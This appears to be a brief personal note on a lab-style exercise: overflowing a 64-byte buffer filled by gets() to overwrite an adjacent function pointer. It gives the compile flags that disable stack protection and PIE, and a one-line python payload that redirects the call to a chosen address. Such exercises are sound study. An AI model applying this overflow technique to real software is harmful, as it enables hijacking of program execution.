the gets copy into buffer of size 64, the next value is function pointer which is called below

we could overwrite it with a address of a function that might wanna call

i had to compile the program with 

gcc -fno-stack-protector -no-pie program.c -o program

to make the function address static

use gdb or objdump to find the location of the function

python3 -c 'from pwn import *;print("A"*64 + "\x66\x11\x40");' | ./program
